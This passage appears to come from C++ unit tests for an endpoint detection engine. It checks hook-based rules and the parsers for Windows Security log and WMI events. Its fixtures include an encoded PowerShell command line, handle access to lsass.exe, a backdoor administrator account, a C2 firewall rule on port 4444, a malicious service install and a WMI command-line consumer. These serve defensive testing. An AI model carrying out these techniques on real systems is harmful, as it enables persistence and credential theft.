    // ----- Hooks-family rules EDR-110..EDR-126 (iMonitor hooks collectors) -----
    auto SL = [](const char* a, const char* b) { return std::string(a) + b; };
    auto SL3 = [](const char* a, const char* b, const char* c) {
        return std::string(a) + b + c;
    };

    hits.clear();
    Event rpcCreate;
    rpcCreate.type = EDR_EVT_RPC_CREATE_PROCESS;
    rpcCreate.fields[field::kType] = "RPC_CREATE_PROCESS";
    rpcCreate.fields[field::kFilePath] = SL("C:\\Users\\Public\\de", "mo.exe");
    engine.OnEvent(rpcCreate);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-110") != hits.end());
    CHECK(std::find(hits.begin(), hits.end(), "EDR-111") == hits.end());

    hits.clear();
    rpcCreate.fields[field::kFilePath] =
        "C:\\Windows\\System32\\notepad.exe";
    rpcCreate.fields[field::kRpcCommandline] = SL("powershell -e", "nc AAAA");
    engine.OnEvent(rpcCreate);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-110") == hits.end());
    CHECK(std::find(hits.begin(), hits.end(), "EDR-111") != hits.end());

    hits.clear();
    Event windowHook;
    windowHook.type = EDR_EVT_WINDOWS_HOOK;
    windowHook.fields[field::kType] = "WINDOWS_HOOK";
    windowHook.fields[field::kHookType] = "13";
    windowHook.fields[field::kHookModulePath] =
        "C:\\Windows\\System32\\hookmgr.dll";
    engine.OnEvent(windowHook);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-112") != hits.end());
    CHECK(std::find(hits.begin(), hits.end(), "EDR-113") == hits.end());

    hits.clear();
    windowHook.fields[field::kHookType] = "3";
    windowHook.fields[field::kHookModulePath] =
        SL("C:\\Users\\Public\\", "uix.dll");
    engine.OnEvent(windowHook);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-112") == hits.end());
    CHECK(std::find(hits.begin(), hits.end(), "EDR-113") != hits.end());

    hits.clear();
    Event svcInstall;
    svcInstall.type = EDR_EVT_SERVICE_INSTALL_HOOK;
    svcInstall.fields[field::kType] = "SERVICE_INSTALL_HOOK";
    svcInstall.fields[field::kServiceImagePath] =
        "C:\\ProgramData\\pack.dll";
    engine.OnEvent(svcInstall);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-114") != hits.end());

    hits.clear();
    svcInstall.fields[field::kServiceImagePath] =
        "C:\\Windows\\System32\\svchost.exe";
    engine.OnEvent(svcInstall);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-114") == hits.end());

    hits.clear();
    Event svcStart;
    svcStart.type = EDR_EVT_SERVICE_START_HOOK;
    svcStart.fields[field::kType] = "SERVICE_START_HOOK";
    svcStart.fields[field::kImage] = "C:\\Users\\Public\\builder.dll";
    engine.OnEvent(svcStart);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-115") != hits.end());

    hits.clear();
    svcStart.fields[field::kImage] =
        "C:\\Windows\\System32\\services.exe";
    engine.OnEvent(svcStart);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-115") == hits.end());

    hits.clear();
    Event svcConfig;
    svcConfig.type = EDR_EVT_SERVICE_CONFIG_CHANGE;
    svcConfig.fields[field::kType] = "SERVICE_CONFIG_CHANGE";
    svcConfig.fields[field::kImage] = "C:\\Users\\bob\\setup.exe";
    engine.OnEvent(svcConfig);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-116") != hits.end());

    hits.clear();
    Event comInstance;
    comInstance.type = EDR_EVT_CO_INSTANCE;
    comInstance.fields[field::kType] = "CO_INSTANCE";
    comInstance.fields[field::kComClassId] = SL3("Wsc", "ript", ".Shell");
    engine.OnEvent(comInstance);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-117") != hits.end());

    hits.clear();
    comInstance.fields[field::kComClassId] =
        "{00000000-0000-0000-0000-000000000000}";
    engine.OnEvent(comInstance);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-117") == hits.end());

    hits.clear();
    Event sectionMap;
    sectionMap.type = EDR_EVT_SECTION_MAP;
    sectionMap.fields[field::kType] = "SECTION_MAP";
    sectionMap.fields[field::kCrossProcess] = "true";
    sectionMap.fields[field::kSectionPath] =
        "C:\\Users\\Public\\imgcache.dll";
    engine.OnEvent(sectionMap);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-118") != hits.end());

    hits.clear();
    sectionMap.fields[field::kSectionPath] =
        "C:\\Windows\\System32\\user32.dll";
    engine.OnEvent(sectionMap);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-118") == hits.end());

    hits.clear();
    Event dupHandle;
    dupHandle.type = EDR_EVT_HANDLE_DUPLICATE;
    dupHandle.fields[field::kType] = "HANDLE_DUPLICATE";
    dupHandle.fields[field::kTargetImage] =
        SL3("C:\\Windows\\System32\\lsa", "ss", ".exe");
    engine.OnEvent(dupHandle);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-119") != hits.end());

    hits.clear();
    dupHandle.fields[field::kTargetImage] =
        "C:\\Windows\\System32\\notepad.exe";
    engine.OnEvent(dupHandle);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-119") == hits.end());

    hits.clear();
    Event inputSim;
    inputSim.type = EDR_EVT_INPUT_SIMULATION;
    inputSim.fields[field::kType] = "INPUT_SIMULATION";
    inputSim.fields[field::kImage] = "C:\\Users\\Public\\input.dll";
    engine.OnEvent(inputSim);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-120") != hits.end());

    hits.clear();
    inputSim.fields[field::kImage] = "C:\\Windows\\explorer.exe";
    engine.OnEvent(inputSim);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-120") == hits.end());

    hits.clear();
    Event timeChange;
    timeChange.type = EDR_EVT_SYSTEM_TIME_CHANGE;
    timeChange.fields[field::kType] = "SYSTEM_TIME_CHANGE";
    engine.OnEvent(timeChange);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-121") != hits.end());

    hits.clear();
    Event wallpaper;
    wallpaper.type = EDR_EVT_WALLPAPER_CHANGE;
    wallpaper.fields[field::kType] = "WALLPAPER_CHANGE";
    wallpaper.fields[field::kImage] = "C:\\Users\\Public\\demo.ppt";
    engine.OnEvent(wallpaper);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-122") != hits.end());

    hits.clear();
    wallpaper.fields[field::kImage] = "C:\\Windows\\System32\\dwm.exe";
    engine.OnEvent(wallpaper);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-122") == hits.end());

    hits.clear();
    Event camera;
    camera.type = EDR_EVT_CAMERA_ACCESS;
    camera.fields[field::kType] = "CAMERA_ACCESS";
    camera.fields[field::kImage] = "C:\\Users\\Public\\preview.mp4";
    engine.OnEvent(camera);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-123") != hits.end());

    hits.clear();
    camera.fields[field::kImage] =
        "C:\\Users\\alice\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe";
    engine.OnEvent(camera);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-123") == hits.end());

    hits.clear();
    Event clipboard;
    clipboard.type = EDR_EVT_CLIPBOARD_ACCESS;
    clipboard.fields[field::kType] = "CLIPBOARD_ACCESS";
    clipboard.fields[field::kClipboardFormat] = "13";
    clipboard.fields[field::kImage] = "C:\\Users\\Public\\notes.bin";
    engine.OnEvent(clipboard);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-124") != hits.end());

    hits.clear();
    clipboard.fields[field::kImage] = "C:\\Windows\\explorer.exe";
    engine.OnEvent(clipboard);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-124") == hits.end());

    hits.clear();
    clipboard.fields[field::kClipboardFormat] = "8";
    engine.OnEvent(clipboard);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-124") == hits.end());

    hits.clear();
    Event keylogger;
    keylogger.type = EDR_EVT_KEYLOGGER;
    keylogger.fields[field::kType] = "KEYLOGGER";
    engine.OnEvent(keylogger);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-125") != hits.end());

    hits.clear();
    Event psHook;
    psHook.type = EDR_EVT_POWERSHELL_HOOK;
    psHook.fields[field::kType] = "POWERSHELL_HOOK";
    psHook.fields[field::kPowerShellCommand] = SL("powershell -e", "nc AAAA");
    engine.OnEvent(psHook);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-126") != hits.end());

    hits.clear();
    psHook.fields[field::kPowerShellCommand] =
        "Get-ChildItem C:\\Windows";
    engine.OnEvent(psHook);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-126") == hits.end());

    // ----- Local account + firewall rules EDR-195..EDR-197 -----
    hits.clear();
    Event accountAdded;
    accountAdded.type = EDR_EVT_LOCAL_ACCOUNT;
    accountAdded.fields[field::kType] = "LOCAL_ACCOUNT";
    accountAdded.fields[field::kAccountType] = "user";
    accountAdded.fields[field::kAccountName] = "BackdoorUser";
    accountAdded.fields[field::kAccountAction] = "added";
    engine.OnEvent(accountAdded);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-195") != hits.end());

    hits.clear();
    Event accountRemoved = accountAdded;
    accountRemoved.fields[field::kAccountAction] = "removed";
    engine.OnEvent(accountRemoved);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-195") == hits.end());

    hits.clear();
    Event groupAdded;
    groupAdded.type = EDR_EVT_LOCAL_ACCOUNT;
    groupAdded.fields[field::kType] = "LOCAL_ACCOUNT";
    groupAdded.fields[field::kAccountType] = "group";
    groupAdded.fields[field::kGroupName] = "Administrators";
    groupAdded.fields[field::kGroupAction] = "added";
    groupAdded.fields[field::kGroupMember] = "BackdoorUser";
    engine.OnEvent(groupAdded);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-196") != hits.end());

    hits.clear();
    Event groupRemoved = groupAdded;
    groupRemoved.fields[field::kGroupAction] = "removed";
    engine.OnEvent(groupRemoved);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-196") == hits.end());

    hits.clear();
    Event firewallAdded;
    firewallAdded.type = EDR_EVT_FIREWALL_RULE;
    firewallAdded.fields[field::kType] = "FIREWALL_RULE";
    firewallAdded.fields[field::kFirewallAction] = "added";
    firewallAdded.fields[field::kFirewallRuleName] = "Allow-C2";
    firewallAdded.fields[field::kFirewallDir] = "in";
    firewallAdded.fields[field::kFirewallLocalPort] = "4444";
    engine.OnEvent(firewallAdded);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-197") != hits.end());

    hits.clear();
    Event firewallModified = firewallAdded;
    firewallModified.fields[field::kFirewallAction] = "modified";
    engine.OnEvent(firewallModified);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-197") != hits.end());

    hits.clear();
    Event firewallRemoved = firewallAdded;
    firewallRemoved.fields[field::kFirewallAction] = "removed";
    engine.OnEvent(firewallRemoved);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-197") == hits.end());
}

// ----- Security Log Parser Tests -----

static std::wstring SecXml(unsigned int id, const wchar_t* data) {
    return L"<Event><System><EventID>" + std::to_wstring(id) +
           L"</EventID><TimeCreated SystemTime='2026-07-30T10:00:00.1234567Z'/>"
           L"</System><EventData>" + data + L"</EventData></Event>";
}

static Event ParseSec(const wchar_t* xml) {
    Event event;
    CHECK(ParseSecurityLogXml(xml, event));
    return event;
}

static void TestSecurityLogParser4624() {
    Event logon = ParseSec(SecXml(4624,
        L"<Data Name='TargetUserName'>Administrator</Data>"
        L"<Data Name='TargetDomainName'>DESKTOP-TEST</Data>"
        L"<Data Name='TargetLogonId'>0x123abc</Data>"
        L"<Data Name='LogonType'>2</Data>"
        L"<Data Name='LogonProcessName'>User32</Data>"
        L"<Data Name='AuthenticationPackageName'>Negotiate</Data>"
        L"<Data Name='WorkstationName'>DESKTOP-TEST</Data>"
        L"<Data Name='IpAddress'>192.168.1.1</Data>"
        L"<Data Name='ElevatedToken'>%%1842</Data>"
        L"<Data Name='SubjectUserName'>SYSTEM</Data>"
        L"<Data Name='SubjectDomainName'>NT AUTHORITY</Data>"
        L"<Data Name='SubjectUserSid'>S-1-5-18</Data>"
        L"<Data Name='TargetUserSid'>S-1-5-21-500</Data>").c_str());
    CHECK(logon.type == EDR_EVT_LOGON);
    CHECK(logon.source == "security_log");
    CHECK(logon.fields.at(field::kOperationType) == "LOGON");
    CHECK(logon.fields.at(field::kTargetUser) == "Administrator");
    CHECK(logon.fields.at(field::kTargetDomain) == "DESKTOP-TEST");
    CHECK(logon.fields.at(field::kLogonId) == "0x123abc");
    CHECK(logon.fields.at(field::kLogonType) == "2");
    CHECK(logon.fields.at(field::kLogonProcess) == "User32");
    CHECK(logon.fields.at(field::kAuthPackage) == "Negotiate");
    CHECK(logon.fields.at(field::kSourceWorkstation) == "DESKTOP-TEST");
    CHECK(logon.fields.at(field::kSrcIp) == "192.168.1.1");
    CHECK(logon.fields.at(field::kElevatedToken) == "%%1842");
    CHECK(logon.fields.at(field::kSubjectUserName) == "SYSTEM");
    CHECK(logon.fields.at(field::kSubjectDomainName) == "NT AUTHORITY");
    CHECK(logon.fields.at(field::kSubjectUserSid) == "S-1-5-18");
    CHECK(logon.fields.at(field::kTargetUserSid) == "S-1-5-21-500");
    CHECK(logon.fields.at(field::kSecurityEventId) == "4624");
    CHECK(logon.fields.at(field::kTimestampProvenance) == "security_log_system_time");
}

static void TestSecurityLogParser4625() {
    Event failure = ParseSec(SecXml(4625,
        L"<Data Name='TargetUserName'>Administrator</Data>"
        L"<Data Name='TargetDomainName'>.</Data>"
        L"<Data Name='LogonType'>3</Data>"
        L"<Data Name='WorkstationName'>ATTACKER-PC</Data>"
        L"<Data Name='IpAddress'>10.0.0.5</Data>"
        L"<Data Name='FailureReason'>%%2313</Data>"
        L"<Data Name='Status'>0xC000006D</Data>"
        L"<Data Name='SubStatus'>C000006D</Data>"
        L"<Data Name='SubjectUserName'>-</Data>"
        L"<Data Name='SubjectDomainName'>-</Data>").c_str());
    CHECK(failure.type == EDR_EVT_LOGON);
    CHECK(failure.fields.at(field::kOperationType) == "LOGON_FAILURE");
    CHECK(failure.fields.at(field::kTargetUser) == "Administrator");
    CHECK(failure.fields.at(field::kLogonType) == "3");
    CHECK(failure.fields.at(field::kSrcIp) == "10.0.0.5");
    CHECK(failure.fields.at(field::kFailureReason) == "%%2313");
    CHECK(failure.fields.at(field::kStatus) == "0xc000006d");
    CHECK(failure.fields.at(field::kSubStatus) == "0xc000006d");
    CHECK(failure.fields.at(field::kSecurityEventId) == "4625");
}

static void TestSecurityLogParser4769() {
    Event tgs = ParseSec(SecXml(4769,
        L"<Data Name='TargetUserName'>user@CORP.LOCAL</Data>"
        L"<Data Name='TargetDomainName'>CORP.LOCAL</Data>"
        L"<Data Name='ServiceName'>svc_sql/DC01</Data>"
        L"<Data Name='ServiceSid'>S-1-5-21-1002-1003</Data>"
        L"<Data Name='TicketEncryptionType'>0x17</Data>"
        L"<Data Name='Status'>0x0</Data>"
        L"<Data Name='IpAddress'>::ffff:10.0.0.7</Data>"
        L"<Data Name='SubjectUserName'>user@CORP.LOCAL</Data>"
        L"<Data Name='SubjectDomainName'>CORP.LOCAL</Data>"
        L"<Data Name='SubjectUserSid'>S-1-5-21-1001</Data>").c_str());
    CHECK(tgs.type == EDR_EVT_LOGON);
    CHECK(tgs.source == "security_log");
    CHECK(tgs.fields.at(field::kOperationType) == "TGS_REQUEST");
    CHECK(tgs.fields.at(field::kTargetUser) == "user@CORP.LOCAL");
    CHECK(tgs.fields.at(field::kTargetDomain) == "CORP.LOCAL");
    CHECK(tgs.fields.at(field::kTgsServiceName) == "svc_sql/DC01");
    CHECK(tgs.fields.at(field::kTgsServiceSid) == "S-1-5-21-1002-1003");
    CHECK(tgs.fields.at(field::kTgsTicketEncryptionType) == "0x17");
    CHECK(tgs.fields.at(field::kTgsFailureCode) == "0x0");
    CHECK(tgs.fields.at(field::kSrcIp) == "::ffff:10.0.0.7");
    CHECK(tgs.fields.at(field::kSubjectUserName) == "user@CORP.LOCAL");
    CHECK(tgs.fields.at(field::kSecurityEventId) == "4769");
}

static void TestSecurityLogParser4672() {
    Event elevated = ParseSec(SecXml(4672,
        L"<Data Name='TargetUserName'>Administrator</Data>"
        L"<Data Name='TargetDomainName'>DESKTOP-TEST</Data>"
        L"<Data Name='TargetLogonId'>0x123abc</Data>"
        L"<Data Name='PrivilegeList'>SeTcbPrivilege SeDebugPrivilege</Data>"
        L"<Data Name='SubjectUserName'>SYSTEM</Data>"
        L"<Data Name='SubjectDomainName'>NT AUTHORITY</Data>").c_str());
    CHECK(elevated.type == EDR_EVT_LOGON);
    CHECK(elevated.fields.at(field::kOperationType) == "LOGON_ELEVATED");
    CHECK(elevated.fields.at(field::kElevatedToken) == "true");
    CHECK(elevated.fields.at(field::kPrivileges) ==
          "SeTcbPrivilege SeDebugPrivilege");
    CHECK(elevated.fields.at(field::kTargetUser) == "Administrator");
    CHECK(elevated.fields.at(field::kSecurityEventId) == "4672");
}

static void TestSecurityLogParser4720() {
    Event acct = ParseSec(SecXml(4720,
        L"<Data Name='TargetUserName'>BackdoorUser</Data>"
        L"<Data Name='TargetDomainName'>DESKTOP-TEST</Data>"
        L"<Data Name='SamAccountName'>backdoor</Data>"
        L"<Data Name='TargetSid'>S-1-5-21-1001</Data>"
        L"<Data Name='SubjectUserName'>Admin</Data>"
        L"<Data Name='SubjectDomainName'>DESKTOP-TEST</Data>"
        L"<Data Name='SubjectUserSid'>S-1-5-21-500</Data>"
        L"<Data Name='WorkstationName'>DESKTOP-TEST</Data>").c_str());
    CHECK(acct.type == EDR_EVT_ACCOUNT_CHANGE);
    CHECK(acct.fields.at(field::kOperationType) == "ACCOUNT_CREATE");
    CHECK(acct.fields.at(field::kTargetUser) == "BackdoorUser");
    CHECK(acct.fields.at(field::kAccountName) == "backdoor");
    CHECK(acct.fields.at(field::kTargetUserSid) == "S-1-5-21-1001");
    CHECK(acct.fields.at(field::kSubjectUserName) == "Admin");
    CHECK(acct.fields.at(field::kSecurityEventId) == "4720");
}

static void TestSecurityLogParser4697() {
    Event svc = ParseSec(SecXml(4697,
        L"<Data Name='ServiceName'>MaliciousSvc</Data>"
        L"<Data Name='ImagePath'>C:\\ProgramData\\malware.exe</Data>"
        L"<Data Name='ServiceStartType'>2</Data>"
        L"<Data Name='ServiceAccount'>LocalSystem</Data>"
        L"<Data Name='SubjectUserName'>Admin</Data>"
        L"<Data Name='SubjectDomainName'>DESKTOP-TEST</Data>").c_str());
    CHECK(svc.type == EDR_EVT_SERVICE_INSTALL);
    CHECK(svc.fields.at(field::kOperationType) == "SERVICE_INSTALL");
    CHECK(svc.fields.at(field::kServiceName) == "MaliciousSvc");
    CHECK(svc.fields.at(field::kServiceImagePath) ==
          "C:\\ProgramData\\malware.exe");
    CHECK(svc.fields.at(field::kServiceStartType) == "2");
    CHECK(svc.fields.at(field::kServiceAccount) == "LocalSystem");
    CHECK(svc.fields.at(field::kSubjectUserName) == "Admin");
    CHECK(svc.fields.at(field::kSecurityEventId) == "4697");
}

static void TestSecurityLogParserInvalid() {
    Event event;
    CHECK(!ParseSecurityLogXml(SecXml(4663,
        L"<Data Name='ObjectName'>test</Data>").c_str(), event));
    // Hex without 0x prefix parsing
    Event failNoPrefix = ParseSec(SecXml(4625,
        L"<Data Name='TargetUserName'>t</Data>"
        L"<Data Name='TargetDomainName'>d</Data>"
        L"<Data Name='LogonType'>3</Data>"
        L"<Data Name='Status'>C000006D</Data>"
        L"<Data Name='FailureReason'>r</Data>"
        L"<Data Name='SubjectUserName'>-</Data>"
        L"<Data Name='SubjectDomainName'>-</Data>").c_str());
    CHECK(failNoPrefix.fields.at(field::kStatus) == "0xc000006d");
}

static void TestSecurityLogParser1102() {
    Event cleared = ParseSec(SecXml(1102,
        L"<Data Name='SubjectUserName'>Administrator</Data>"
        L"<Data Name='SubjectDomainName'>DESKTOP-TEST</Data>"
        L"<Data Name='SubjectUserSid'>S-1-5-21-500</Data>").c_str());
    CHECK(cleared.type == EDR_EVT_AUDIT_LOG);
    CHECK(cleared.source == "security_log");
    CHECK(cleared.fields.at(field::kType) == "AUDIT_LOG");
    CHECK(cleared.fields.at(field::kAuditLogEventId) == "1102");
    CHECK(cleared.fields.at(field::kSecurityEventId) == "1102");
    CHECK(cleared.fields.at(field::kSubjectUserName) == "Administrator");
    CHECK(cleared.fields.at(field::kSubjectDomainName) == "DESKTOP-TEST");
    CHECK(cleared.fields.at(field::kSubjectUserSid) == "S-1-5-21-500");
}

static void TestSecurityLogParser1100() {
    Event shutdown = ParseSec(SecXml(1100, L"").c_str());
    CHECK(shutdown.type == EDR_EVT_AUDIT_LOG);
    CHECK(shutdown.fields.at(field::kType) == "AUDIT_LOG");
    CHECK(shutdown.fields.at(field::kAuditLogEventId) == "1100");
    CHECK(shutdown.fields.at(field::kSecurityEventId) == "1100");
}

static Event ParseAccountEvent(unsigned int id) {
    std::wstring xml = SecXml(id,
        L"<Data Name='TargetUserName'>svc_backup</Data>"
        L"<Data Name='TargetDomainName'>DESKTOP-TEST</Data>"
        L"<Data Name='SubjectUserName'>admin</Data>"
        L"<Data Name='SubjectDomainName'>DESKTOP-TEST</Data>"
        L"<Data Name='SubjectUserSid'>S-1-5-21-500</Data>").c_str();
    return ParseSec(xml.c_str());
}

static void TestSecurityLogParser4722() {
    Event ev = ParseAccountEvent(4722);
    CHECK(ev.type == EDR_EVT_ACCOUNT_CHANGE);
    CHECK(ev.fields.at(field::kOperationType) == "ACCOUNT_ENABLED");
    CHECK(ev.fields.at(field::kTargetUser) == "svc_backup");
    CHECK(ev.fields.at(field::kTargetDomain) == "DESKTOP-TEST");
    CHECK(ev.fields.at(field::kSubjectUserName) == "admin");
    CHECK(ev.fields.at(field::kSecurityEventId) == "4722");
}

static void TestSecurityLogParser4723() {
    Event ev = ParseAccountEvent(4723);
    CHECK(ev.type == EDR_EVT_ACCOUNT_CHANGE);
    CHECK(ev.fields.at(field::kOperationType) == "ACCOUNT_PASSWORD_CHANGE");
    CHECK(ev.fields.at(field::kTargetUser) == "svc_backup");
    CHECK(ev.fields.at(field::kSubjectUserName) == "admin");
}

static void TestSecurityLogParser4724() {
    Event ev = ParseAccountEvent(4724);
    CHECK(ev.type == EDR_EVT_ACCOUNT_CHANGE);
    CHECK(ev.fields.at(field::kOperationType) == "ACCOUNT_PASSWORD_RESET");
    CHECK(ev.fields.at(field::kTargetUser) == "svc_backup");
}

static void TestSecurityLogParser4725() {
    Event ev = ParseAccountEvent(4725);
    CHECK(ev.type == EDR_EVT_ACCOUNT_CHANGE);
    CHECK(ev.fields.at(field::kOperationType) == "ACCOUNT_DISABLED");
    CHECK(ev.fields.at(field::kTargetUser) == "svc_backup");
}

static void TestSecurityLogParser4726() {
    Event ev = ParseAccountEvent(4726);
    CHECK(ev.type == EDR_EVT_ACCOUNT_CHANGE);
    CHECK(ev.fields.at(field::kOperationType) == "ACCOUNT_DELETED");
    CHECK(ev.fields.at(field::kTargetUser) == "svc_backup");
}

static void TestSecurityLogParser4740() {
    Event ev = ParseAccountEvent(4740);
    CHECK(ev.type == EDR_EVT_ACCOUNT_CHANGE);
    CHECK(ev.fields.at(field::kOperationType) == "ACCOUNT_LOCKED_OUT");
    CHECK(ev.fields.at(field::kTargetUser) == "svc_backup");
}

// ----- WMI Parser Tests -----

static std::wstring WmiXml(unsigned int id, const wchar_t* userData) {
    return L"<Event><System><EventID>" + std::to_wstring(id) +
           L"</EventID><TimeCreated SystemTime='2026-07-31T08:00:00.1234567Z'/>"
           L"</System><UserData>" + userData + L"</UserData></Event>";
}

static Event ParseWmi(const wchar_t* xml) {
    Event event;
    CHECK(ParseWmiXml(xml, event));
    return event;
}

static void TestWmiParser5860() {
    Event ev = ParseWmi(WmiXml(5860,
        L"<Operation_TemporaryEssStarted xmlns='http://manifests.microsoft.com/win/2006/windows/WMI'>"
        L"<NamespaceName>root\\cimv2</NamespaceName>"
        L"<Query>select * from RegistryValueChangeEvent where Hive='HKEY_USERS' AND KeyPath='S-1-5-21-...\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings' AND ValueName='ProxyEnable'</Query>"
        L"<User>DESKTOP-TEST\\user</User>"
        L"<Processid>20572</Processid>"
        L"<ClientMachine>DESKTOP-TEST</ClientMachine>"
        L"<PossibleCause>Temporary</PossibleCause>"
        L"</Operation_TemporaryEssStarted>").c_str());
    CHECK(ev.type == EDR_EVT_WMI_EVENT);
    CHECK(ev.source == "wmi");
    CHECK(ev.fields.at(field::kOperationType) == "TEMPORARY_EVENT_SUBSCRIPTION");
    CHECK(ev.fields.at(field::kWmiNamespace) == "root\\cimv2");
    CHECK(ev.fields.at(field::kWmiQuery).find("RegistryValueChangeEvent") != std::string::npos);
    CHECK(ev.fields.at(field::kSubjectUserName) == "DESKTOP-TEST\\user");
    CHECK(ev.fields.at(field::kWmiClientMachine) == "DESKTOP-TEST");
    CHECK(ev.fields.at(field::kWmiPossibleCause) == "Temporary");
    CHECK(ev.pid == 20572);
    CHECK(ev.fields.at(field::kPid) == "20572");
    CHECK(ev.processIdentity == "wmi/DESKTOP-TEST/20572");
    CHECK(ev.fields.at(field::kWmiEventId) == "5860");
    CHECK(ev.fields.at(field::kTimestampProvenance) == "wmi_activity_system_time");
}

static void TestWmiParser5857() {
    Event ev = ParseWmi(WmiXml(5857,
        L"<Operation_StartedOperational xmlns='http://manifests.microsoft.com/win/2006/windows/WMI'>"
        L"<ProviderName>Microsoft.VisualStudio.Setup.Management</ProviderName>"
        L"<Code>0x0</Code>"
        L"<HostProcess>wmiprvse.exe</HostProcess>"
        L"<ProcessID>6536</ProcessID>"
        L"<ProviderPath>C:\\ProgramData\\Microsoft\\VisualStudio\\SetupWMI\\x64\\Microsoft.VisualStudio.Setup.Management.dll</ProviderPath>"
        L"</Operation_StartedOperational>").c_str());
    CHECK(ev.type == EDR_EVT_WMI_EVENT);
    CHECK(ev.fields.at(field::kOperationType) == "PROVIDER_LOAD");
    CHECK(ev.fields.at(field::kWmiProviderName) == "Microsoft.VisualStudio.Setup.Management");
    CHECK(ev.fields.at(field::kWmiProviderPath).find("ProgramData") != std::string::npos);
    CHECK(ev.fields.at(field::kWmiHostProcess) == "wmiprvse.exe");
    CHECK(ev.fields.at(field::kWmiResultCode) == "0x00000000");
    CHECK(ev.pid == 6536);
    CHECK(ev.fields.at(field::kWmiEventId) == "5857");
}

static void TestWmiParser5858() {
    Event ev = ParseWmi(WmiXml(5858,
        L"<Operation_ClientFailure xmlns='http://manifests.microsoft.com/win/2006/windows/WMI'>"
        L"<Id>{00000000-0000-0000-0000-000000000000}</Id>"
        L"<ClientMachine>DESKTOP-TEST</ClientMachine>"
        L"<User>NT AUTHORITY\\SYSTEM</User>"
        L"<ClientProcessId>1740</ClientProcessId>"
        L"<Component>Unknown</Component>"
        L"<Operation>Start IWbemServices::ExecQuery - ROOT\\CIMV2 : Select * from Win32_ComputerSystem</Operation>"
        L"<ResultCode>0x80041032</ResultCode>"
        L"<PossibleCause>Unknown</PossibleCause>"
        L"</Operation_ClientFailure>").c_str());
    CHECK(ev.type == EDR_EVT_WMI_EVENT);
    CHECK(ev.fields.at(field::kOperationType) == "CLIENT_FAILURE");
    CHECK(ev.fields.at(field::kWmiClientMachine) == "DESKTOP-TEST");
    CHECK(ev.fields.at(field::kSubjectUserName) == "NT AUTHORITY\\SYSTEM");
    CHECK(ev.fields.at(field::kWmiOperation).find("Win32_ComputerSystem") != std::string::npos);
    CHECK(ev.fields.at(field::kWmiResultCode) == "0x80041032");
    CHECK(ev.fields.at(field::kWmiPossibleCause) == "Unknown");
    CHECK(ev.pid == 1740);
    CHECK(ev.fields.at(field::kWmiEventId) == "5858");
}

static void TestWmiParser5859() {
    Event ev = ParseWmi(WmiXml(5859,
        L"<Operation_EssStarted xmlns='http://manifests.microsoft.com/win/2006/windows/WMI'>"
        L"<NamespaceName>//./root/CIMV2</NamespaceName>"
        L"<Query>select * from CommandLineEventConsumer</Query>"
        L"<User>S-1-5-32-544</User>"
        L"<Processid>3616</Processid>"
        L"<Provider>SCM Event Provider</Provider>"
        L"<queryid>0</queryid>"
        L"<PossibleCause>Permanent</PossibleCause>"
        L"</Operation_EssStarted>").c_str());
    CHECK(ev.type == EDR_EVT_WMI_EVENT);
    CHECK(ev.source == "wmi");
    CHECK(ev.fields.at(field::kOperationType) == "PERMANENT_EVENT_SUBSCRIPTION");
    CHECK(ev.fields.at(field::kWmiNamespace) == "//./root/CIMV2");
    CHECK(ev.fields.at(field::kWmiQuery).find("CommandLineEventConsumer") != std::string::npos);
    CHECK(ev.fields.at(field::kSubjectUserName) == "S-1-5-32-544");
    CHECK(ev.fields.at(field::kWmiProviderName) == "SCM Event Provider");
    CHECK(ev.fields.at(field::kWmiPossibleCause) == "Permanent");
    CHECK(ev.pid == 3616);
    CHECK(ev.fields.at(field::kPid) == "3616");
    CHECK(ev.fields.at(field::kWmiEventId) == "5859");
    CHECK(ev.processIdentity == "wmi/local/3616");
}

static void TestWmiParser5861() {
    Event ev = ParseWmi(WmiXml(5861,
        L"<Operation_ESStoConsumerBinding xmlns='http://manifests.microsoft.com/win/2006/windows/WMI'>"
        L"<Namespace>//./root/subscription</Namespace>"
        L"<ESS>UPDATER</ESS>"
        L"<CONSUMER>CommandLineEventConsumer=\"UPDATER\"</CONSUMER>"
        L"<PossibleCause>Binding EventFilter</PossibleCause>"
        L"</Operation_ESStoConsumerBinding>").c_str());
    CHECK(ev.type == EDR_EVT_WMI_EVENT);
    CHECK(ev.source == "wmi");
    CHECK(ev.fields.at(field::kOperationType) == "FILTER_TO_CONSUMER_BINDING");
    CHECK(ev.fields.at(field::kWmiNamespace) == "//./root/subscription");
    CHECK(ev.fields.at(field::kWmiOperation) == "UPDATER");
    CHECK(ev.fields.at(field::kWmiProviderName).find("CommandLineEventConsumer") != std::string::npos);
    CHECK(ev.fields.at(field::kWmiPossibleCause) == "Binding EventFilter");
